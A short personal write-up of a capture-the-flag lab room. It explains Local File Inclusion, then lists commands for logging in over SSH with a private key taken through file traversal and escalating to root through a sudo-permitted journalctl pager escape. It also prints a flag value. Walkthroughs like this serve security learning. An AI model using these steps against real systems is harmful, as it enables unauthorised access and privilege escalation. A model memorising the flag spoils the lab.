24 June 2021	-	Thursday

LFI
---

Local File Inclusion (LFI) is the vulnerability that is mostly found in web servers. This vulnerability is exploited when a user input contains a certain path to the file which might be present on the server and will be included in the output. This kind of vulnerability can be used to read files containing sensitive and confidential data from the vulnerable system.



*	Read ssh private using LFI bug (i.e. file traversal reading file)

*	ssh private key of remote server is stored on `privateKey` file

###	connect to server using private key:

*	make `privateKey` as a priviledged file (i.e. only read/write access by current user).
	```
	chmod 600 privateKey
	```

*	connect to server via __ssh__ using privateKey.
	```
	ssh -i ./privateKey falcon@10.10.39.9
	```

*	Now read `user.txt` file to get first flag.
	```
	B8LEGIF049JT4RTVWUG4
	```

*	see what commands current user can run with sudo using `sudo -l` command
	```
	/bin/journalctl
	```

*	search for `journalctl` and see any stuff related to privilege escalation.

	*	got this site: https://gtfobins.github.io/gtfobins/journalctl/

*	basically just run this command:
	```
	sudo journalctl
	```

	*	Basically this invokes the default pager as **root** user using `vim` editor inside the shell.

*	using this command, you can read `root.txt` flag, which can only be read by root user.
	```
	!cat /root/root.txt
	```



Hense room's complete